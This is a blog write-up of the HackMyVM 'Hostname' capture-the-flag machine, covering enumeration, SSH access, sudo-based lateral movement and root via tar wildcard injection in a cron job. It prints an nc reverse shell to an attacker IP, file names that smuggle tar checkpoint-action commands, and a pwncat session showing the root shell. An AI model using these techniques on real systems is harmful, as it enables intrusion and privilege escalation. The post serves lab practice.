---
layout: post
title: "HackMyVM - Hostname"
date: 2022-05-10 15:47:00 +0100
categories: hmv
---

Creator: [avijneyam](https://hackmyvm.eu/profile/?user=avijneyam)
Level: Easy
Release Date: 2022-05-04

## Scan

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 18:35 WEST
Nmap scan report for 192.168.1.154
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Panda
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```


## Enumeration

* From Page Source

```html
 <script crossorigin="S3VuZ19GdV9QNG5kYQ==" </script> 
 ```

```bash
$ echo 'S3VuZ19GdV9QNG5kYQ==' | base64 -d 
Kung_Fu_P4nda    
```

### GoBuster

```bash
$ gobuster dir -u http://panda.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://panda.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt,zip
[+] Timeout:                 10s
===============================================================
2022/05/10 18:43:38 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1621]
/assets               (Status: 403) [Size: 153]                                  
===============================================================                                                                                                        
2022/05/10 18:48:02 Finished                                                                                                                                           
===============================================================   
```

## Username

<img src="https://drive.google.com/uc?id=1j7pa8WlQF7AWOYqaxLfla209-epIcfY7"/>

* Disable "po" replace for "Kung_Fu_P4nda"

<img src="https://drive.google.com/uc?id=1EH5c6TJak3yEugmRSRFR92Uq7DGu7xs8"/>

<img src="https://drive.google.com/uc?id=1fWByrtnjexeNV-8IL5tayAo22yiY9_bJ"/>

## Lateral Movement (po > oogway)

```bash
$ ssh po@panda.hmv     
Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
po@hostname:~$ 
```

#### SUDO

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
Sudoers file: /etc/sudoers.d/po is readable                                                                                                                            
po HackMyVM = (oogway) NOPASSWD: /bin/bash
```

```bash
po@hostname:/tmp$ echo "po HackMyVM = (oogway) NOPASSWD: /bin/bash" > sudoers

po@hostname:/tmp$ cat sudoers 
po HackMyVM = (oogway) NOPASSWD: /bin/bash

po@hostname:/tmp$ sudo -u oogway -h HackMyVM /bin/bash
sudo: unable to resolve host HackMyVM: Name or service not known

oogway@hostname:/tmp$ 
```

## CRONTAB

```bash
*  *    * * *   root    cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
```

* pspy64

```bash
2022/05/19 21:08:01 CMD: UID=0    PID=23515  | /usr/sbin/CRON -f 
2022/05/19 21:08:01 CMD: UID=0    PID=23516  | /bin/sh -c       cd /opt/secret/ && tar -zcf /var/backups/secret.tgz * 
2022/05/19 21:08:01 CMD: UID=0    PID=23517  | tar -zcf /var/backups/secret.tgz * 
2022/05/19 21:08:01 CMD: UID=0    PID=23518  | /bin/sh -c gzip 
```

## ROOT - Relative Path with [tar](https://gtfobins.github.io/gtfobins/tar/#sudo)

* If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```bash
payload.sh
nc -e /bin/bash 192.168.1.6 9001
```

```bash
oogway@hostname:/opt/secret$ echo "" > "--checkpoint=1"
oogway@hostname:/opt/secret$ echo "" > "--checkpoint-action=exec=bash payload.sh"
oogway@hostname:/opt/secret$ ls
'--checkpoint=1'  '--checkpoint-action=exec=bash payload.sh'   payload.sh
oogway@hostname:/opt/secret$ 
```

```bash
$ python3 -m pwncat -lp 9001
[03:52:54] Welcome to pwncat 🐈!                                                                                                                        __main__.py:164
[03:58:01] received connection from 192.168.1.154:42082                                                                                                      bind.py:84
[03:58:01] 192.168.1.154:42082: registered new host w/ db                                                                                                manager.py:957
(local) pwncat$                                                                                                                                                        
(remote) root@hostname:/opt/secret# id
uid=0(root) gid=0(root) groups=0(root)
(remote) root@hostname:/opt/secret# 
```